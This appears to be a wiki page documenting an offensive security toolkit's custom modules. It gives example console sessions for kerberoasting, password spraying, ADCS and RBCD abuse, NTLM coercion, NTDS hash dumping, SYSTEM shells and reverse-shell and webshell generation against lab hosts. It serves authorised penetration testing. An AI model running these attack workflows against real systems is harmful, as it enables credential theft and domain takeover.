---
layout: wiki
title: Custom Tooling - UwU Toolkit
permalink: /uwu-toolkit/custom-tooling/
---

# Custom Tooling

All custom-built modules in UwU Toolkit. These are purpose-built attack, enumeration, and post-exploitation modules — not wrappers around external tools.

For Impacket/BloodyAD wrappers, see [Integrations](/uwu-toolkit/integrations/).

---

## Table of Contents

- [AD Attack Modules](#ad-attack-modules)
- [AD Enumeration Modules](#ad-enumeration-modules)
- [ADCS Modules](#adcs-modules)
- [Delegation Modules](#delegation-modules)
- [SMB Modules](#smb-modules)
- [Enumeration Modules](#enumeration-modules)
- [Post-Exploitation — Linux](#post-exploitation--linux)
- [Post-Exploitation — Windows](#post-exploitation--windows)
- [Pivoting](#pivoting)
- [Payloads](#payloads)
- [Cracking](#cracking)
- [Web Modules](#web-modules)
- [Git Modules](#git-modules)
- [AWS Modules](#aws-modules)
- [RDP Modules](#rdp-modules)
- [SSH Modules](#ssh-modules)
- [Exploits](#exploits)

---

## AD Attack Modules

Custom multi-step Active Directory attack modules.

| Module | Path | Description |
|--------|------|-------------|
| **Kerberoast** | `ad/kerberoast` | Request TGS tickets for offline cracking |
| **AS-REP Roast** | `ad/asreproast` | AS-REP roast users without Kerberos pre-auth |
| **Targeted Kerberoast** | `ad/targeted_kerberoast` | Kerberoast with SPN manipulation on writable accounts |
| **Password Spray** | `ad/password_spray` | Password spraying with lockout-aware delays |
| **Kerberos User Enum** | `ad/kerb_userenum` | Enumerate valid usernames via Kerberos |
| **NetExec** | `ad/netexec` | Full NetExec wrapper (SMB, LDAP, WinRM, RDP, MSSQL, SSH) |
| **Evil-WinRM** | `ad/evil_winrm` | Evil-WinRM session management |
| **BadSuccessor** | `ad/badsuccessor` | BadSuccessor dMSA privilege escalation |
| **WriteAccountRestrictions** | `ad/WriteAccountRestrictions` | WriteAccountRestrictions ACL abuse |

### Kerberoast Example

```bash
uwu > use ad/kerberoast
uwu kerberoast > options

  Name        Current       Required  Description
  ----        -------       --------  -----------
  RHOSTS      10.10.10.100  yes       Target DC IP
  DOMAIN      corp.local    yes       Domain name
  USER        admin         yes       Username
  PASS        Password123   no        Password
  HASHES                    no        NTLM hash (LM:NT)
  DC_IP       10.10.10.100  no        Domain controller IP
  OUTPUT                    no        Output file for hashes

uwu kerberoast > run

[*] Requesting TGS tickets...
[+] Found 3 Kerberoastable accounts
[+] Hashes saved to kerberoast_hashes.txt
```

### Password Spray Example

```bash
uwu > use ad/password_spray
uwu password_spray > set RHOSTS 10.10.10.0/24
uwu password_spray > set USER users.txt
uwu password_spray > set PASS "Spring2026!"
uwu password_spray > set CONTINUE_ON_SUCCESS yes
uwu password_spray > run
```

### NetExec Example

```bash
uwu > use ad/netexec
uwu netexec > set ACTION shares
uwu netexec > run

  SMB  10.10.10.100  CORP  [+] admin:Password123
  SMB  10.10.10.100  CORP  ADMIN$     READ,WRITE
  SMB  10.10.10.100  CORP  SYSVOL     READ
```

---

## AD Enumeration Modules

| Module | Path | Description |
|--------|------|-------------|
| **AD Enum** | `ad/ad_enum` | Comprehensive AD enumeration |
| **AD Enumerate All** | `ad/ad_enumerate_all` | Full-scope AD enumeration pipeline |
| **AD Attack Enum** | `ad/ad_attack_enum` | Attack surface enumeration |
| **BloodHound Collect** | `ad/bloodhound_collect` | BloodHound data collection |
| **BloodHound Edges** | `ad/bloodhound_edges` | BloodHound edge analysis |
| **BloodyHound** | `ad/bloodyhound` | BloodyAD + BloodHound combined workflow |
| **BloodyAD Validate** | `ad/bloodyad_validate` | Validate BloodyAD ACL attack paths |
| **Impacket Validate** | `ad/impacket_validate` | Validate Impacket credential combos |
| **PowerView AutoEnum** | `ad/powerview_autoenum` | Automated PowerView enumeration |
| **PowerView Remote** | `ad/powerview_remote` | Remote PowerView execution |
| **PowerView Remote Exec** | `ad/powerview_remote_exec` | Remote PowerView with command execution |
| **PowerView Lab** | `ad/powerview_lab` | PowerView lab environment setup |
| **SID Lookup** | `ad/sid_lookup` | SID-to-name resolution |
| **UAC Decoder** | `ad/uac_decoder` | Decode userAccountControl flags |

### BloodHound Collection Example

```bash
uwu > use ad/bloodhound_collect
uwu bloodhound_collect > run

[*] Running BloodHound collection...
[+] Data saved to bloodhound_data.zip
```

### AD Enum Example

```bash
uwu > use ad/ad_enum
uwu ad_enum > run

[*] Enumerating domain: corp.local
[*] Users: 42
[*] Groups: 18
[*] Computers: 12
[*] GPOs: 6
[*] Trusts: 1
```

---

## ADCS Modules

Custom modules for Active Directory Certificate Services attacks.

| Module | Path | Description |
|--------|------|-------------|
| **Certipy Find** | `ad/certipy_find` | Discover vulnerable ADCS templates |
| **Certipy Exploit** | `ad/certipy_exploit` | Request certs and authenticate as target users |
| **ADCS Auto** | `ad/adcs_auto` | Automated end-to-end scan + exploit (ESC1/2/3/6/9) |

### Find Vulnerable Templates

```bash
uwu > use ad/certipy_find
uwu certipy_find > run

[*] Enumerating ADCS templates...
[+] CA: CORP-DC01-CA
[+] ESC1: WebServer — enrollee supplies SAN
[+] ESC4: DevTemplate — tyrion has WritePKIEnrollmentFlag
```

### Exploit a Vulnerable Template

```bash
uwu > use ad/certipy_exploit
uwu certipy_exploit > set CA CORP-DC01-CA
uwu certipy_exploit > set TEMPLATE WebServer
uwu certipy_exploit > set TARGET_USER administrator
uwu certipy_exploit > run

[*] Requesting certificate for administrator@corp.local...
[+] Certificate saved to administrator.pfx
[*] Authenticating with certificate...
[+] Got NT hash for administrator
```

### Automated Full Chain

```bash
uwu > use ad/adcs_auto
uwu adcs_auto > run

[*] Phase 1: Scanning for vulnerable templates...
[*] Phase 2: Best path: ESC1 via WebServer
[*] Phase 3: Requesting cert as administrator...
[+] Domain Admin hash obtained
```

---

## Delegation Modules

| Module | Path | Description |
|--------|------|-------------|
| **Delegation Exploit** | `ad/delegation_exploit` | Delegation abuse (unconstrained/constrained/RBCD) |
| **RBCD Auto** | `ad/rbcd_auto` | Automated RBCD attack chain |

### RBCD Auto Example

```bash
uwu > use ad/rbcd_auto
uwu rbcd_auto > set TARGET DC01$
uwu rbcd_auto > run

[*] Step 1: Adding computer account EVIL$...
[*] Step 2: Setting RBCD on DC01$ -> EVIL$...
[*] Step 3: Requesting service ticket via S4U2Proxy...
[+] Got ticket for cifs/DC01 as administrator
```

---

## SMB Modules

| Module | Path | Description |
|--------|------|-------------|
| **SMB Shares** | `auxiliary/smb/smb_shares` | SMB share enumeration and access check |
| **SMB Read** | `auxiliary/smb/smb_read` | Read files from SMB shares |
| **enum4linux** | `auxiliary/smb/enum4linux` | enum4linux-ng wrapper |
| **NTLM Coerce** | `auxiliary/smb/ntlm_coerce` | NTLM authentication coercion (PetitPotam, PrinterBug, etc.) |

### NTLM Coerce Example

```bash
uwu > use auxiliary/smb/ntlm_coerce
uwu ntlm_coerce > set LISTENER 10.10.14.50
uwu ntlm_coerce > run

[*] Trying PetitPotam...
[+] Coercion successful! Check your relay/responder
```

### SMB Shares Example

```bash
uwu > use auxiliary/smb/smb_shares
uwu smb_shares > run

  Share           Access    Description
  -----           ------    -----------
  ADMIN$          READ      Remote Admin
  C$              READ      Default share
  Backups         READ,WRITE Company Backups
  SYSVOL          READ      Logon server share
```

---

## Enumeration Modules

| Module | Path | Description |
|--------|------|-------------|
| **AutoEnum** | `enumeration/autoenum` | Automated enumeration pipeline (like AutoRecon) |
| **Auto Enumerator** | `enumeration/auto_enumerator` | Configurable auto-enumeration |
| **Port Scan** | `enumeration/portscan_fast` | Fast TCP port scanning |
| **DNS Enum** | `enumeration/dns_enum` | DNS enumeration and zone transfer |
| **Web Fuzz** | `enumeration/web_fuzz` | Directory/file fuzzing |
| **FTP Enum** | `enumeration/ftp_enum` | FTP enumeration and anonymous access |
| **NFS Enum** | `enumeration/nfs_enum` | NFS share enumeration |
| **VHost Scan** | `enumeration/vhost_scan` | Virtual host discovery |
| **Dirsearch Scan** | `enumeration/dirsearch_scan` | Dirsearch directory brute-forcing |
| **Gitea Enum** | `enumeration/gitea_enum` | Gitea instance enumeration |
| **CI/CD Detect** | `enumeration/cicd_detect` | CI/CD pipeline detection |

### AutoEnum Example

```bash
uwu > use enumeration/autoenum
uwu autoenum > set RHOSTS 10.10.10.100
uwu autoenum > run

[*] Phase 1: TCP port scan...
[*] Phase 2: Service enumeration...
[*] Phase 3: Script scans...
[+] Results saved to autoenum_10.10.10.100/
```

---

## Post-Exploitation — Linux

| Module | Path | Description |
|--------|------|-------------|
| **LinPEAS** | `post/linux/linpeas_enum` | LinPEAS privilege escalation scan |
| **pspy Monitor** | `post/linux/pspy_monitor` | Process monitoring with pspy64 |
| **Linux Recon** | `post/linux/linux_recon` | Linux system reconnaissance |
| **Privesc Suggest** | `post/linux/privesc_suggest` | Privilege escalation suggester |
| **Linux Enum** | `post/linux_enum` | Linux system enumeration |
| **Linux Privesc** | `post/linux_privesc` | Linux privilege escalation checks |

### LinPEAS Example

```bash
uwu > use post/linux/linpeas_enum
uwu linpeas_enum > set SESSION 1
uwu linpeas_enum > run

[*] Uploading linpeas.sh to target...
[*] Running LinPEAS...
[+] Results saved to linpeas_output.txt
```

---

## Post-Exploitation — Windows

| Module | Path | Description |
|--------|------|-------------|
| **SeBackup Dump** | `post/windows/sebackup_dump` | SeBackupPrivilege NTDS extraction |
| **SeImpersonate** | `post/windows/seimpersonate` | SeImpersonatePrivilege exploitation |
| **LNK Parser** | `post/windows/gather/lnk_parser` | Parse Windows LNK shortcut files |
| **Installed Apps** | `post/windows/gather/installed_apps` | Enumerate installed applications |
| **mRemoteNG Creds** | `post/windows/gather/mremoteng_creds` | Extract mRemoteNG credentials |
| **MSI Finder** | `post/windows/gather/msi_finder` | Find exploitable MSI installers |
| **User Enum** | `post/windows/gather/user_enum` | Windows user enumeration |
| **GPO Abuse** | `post/windows/escalate/gpo_abuse` | GPO abuse for privilege escalation |

### SeBackup Dump Example

```bash
uwu > use post/windows/sebackup_dump
uwu sebackup_dump > run

[*] Exploiting SeBackupPrivilege...
[*] Copying NTDS.dit via shadow copy...
[*] Extracting hashes...
[+] Administrator:500:aad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

### SeImpersonate Example

```bash
uwu > use post/windows/seimpersonate
uwu seimpersonate > set LHOST 10.10.14.50
uwu seimpersonate > set LPORT 9001
uwu seimpersonate > run

[*] Checking available potatoes...
[*] Using GodPotato...
[+] Got SYSTEM shell
```

---

## Pivoting

| Module | Path | Description |
|--------|------|-------------|
| **Ligolo Pivot** | `post/pivot/ligolo_pivot` | Ligolo-ng tunnel management module |

```bash
uwu > use post/pivot/ligolo_pivot
uwu ligolo_pivot > set RHOSTS 10.10.10.100
uwu ligolo_pivot > set INTERNAL_NET 172.16.0.0/24
uwu ligolo_pivot > run
```

---

## Payloads

| Module | Path | Description |
|--------|------|-------------|
| **Reverse Shells** | `payloads/reverse_shells` | Multi-format reverse shell generator |
| **Reverse Shell** | `payloads/reverse_shell` | Single reverse shell payload |
| **ASPX Shell** | `payloads/aspx_shell` | ASPX web shell generator |
| **Donut** | `payloads/donut` | Donut shellcode generator |

### Reverse Shell Generator Example

```bash
uwu > use payloads/reverse_shells
uwu reverse_shells > set LHOST 10.10.14.50
uwu reverse_shells > set LPORT 4444
uwu reverse_shells > options

  Formats: bash, python, powershell, php, ruby, perl, nc, java, csharp

uwu reverse_shells > set FORMAT powershell
uwu reverse_shells > run

[+] PowerShell reverse shell generated:
    powershell -nop -c "$client = New-Object ..."
```

### ASPX Shell Example

```bash
uwu > use payloads/aspx_shell
uwu aspx_shell > set LHOST 10.10.14.50
uwu aspx_shell > set LPORT 4444
uwu aspx_shell > run

[+] ASPX shell written to: shell.aspx
```

---

## Cracking

| Module | Path | Description |
|--------|------|-------------|
| **Hashcrack** | `auxiliary/cracking/hashcrack` | Hash cracking with hashcat or john (local or remote SSH) |
| **Cisco Type 5** | `auxiliary/cracking/cisco_type5_crack` | Cisco Type 5 password cracking |

### Hashcrack Example

```bash
uwu > use auxiliary/cracking/hashcrack
uwu hashcrack > set HASHFILE kerberoast_hashes.txt
uwu hashcrack > set HASHTYPE 13100
uwu hashcrack > run

[*] Cracking with hashcat...
[+] Cracked 2/5 hashes
    svc_sql:Password123!
    svc_backup:Summer2025
```

Remote GPU cracking via SSH — see [Hashcrack SSH Setup](/uwu-toolkit/hashcrack-ssh-setup/).

---

## Web Modules

| Module | Path | Description |
|--------|------|-------------|
| **Username Harvest** | `auxiliary/web/username_harvest` | Harvest usernames from web apps |
| **Web Scanner** | `auxiliary/web/web_scanner` | Web vulnerability scanner |

---

## Git Modules

| Module | Path | Description |
|--------|------|-------------|
| **Gitea API** | `auxiliary/git/gitea_api` | Gitea API enumeration |
| **Gitea Commit Secrets** | `auxiliary/git/gitea_commit_secrets` | Extract secrets from Gitea commits |
| **Git Secrets** | `auxiliary/git/git_secrets` | Scan git repos for secrets |

---

## AWS Modules

| Module | Path | Description |
|--------|------|-------------|
| **S3 Enum** | `auxiliary/aws/s3_enum` | S3 bucket enumeration |
| **IAM Enum** | `auxiliary/aws/iam_enum` | IAM user/role/policy enumeration |
| **EC2 Metadata** | `auxiliary/aws/ec2_metadata` | EC2 metadata service access (SSRF) |
| **Lambda Enum** | `auxiliary/aws/lambda_enum` | Lambda function enumeration |
| **Cred Catcher** | `auxiliary/aws/cred_catcher` | AWS credential harvesting |
| **STS Whoami** | `auxiliary/aws/sts_whoami` | STS GetCallerIdentity check |

---

## RDP Modules

| Module | Path | Description |
|--------|------|-------------|
| **RDP Session** | `auxiliary/rdp/rdp_session` | RDP session management |

---

## SSH Modules

| Module | Path | Description |
|--------|------|-------------|
| **SSH Enum** | `auxiliary/ssh/ssh_enum` | SSH enumeration and banner grabbing |

---

## Exploits

| Module | Path | Description |
|--------|------|-------------|
| **Samba usermap_script** | `exploits/samba_usermap_script` | Samba RCE (CVE-2007-2447) |
| **Git Webshell** | `exploits/cicd/git_webshell` | CI/CD git-based webshell deployment |
| **PDF24 Privesc** | `exploits/windows/local/pdf24_privesc` | PDF24 local privilege escalation |

---

## Lab Modules

| Module | Path | Description |
|--------|------|-------------|
| **Iron Throne Bench** | `ad/iron_throne_bench` | Iron Throne lab benchmark suite |

---
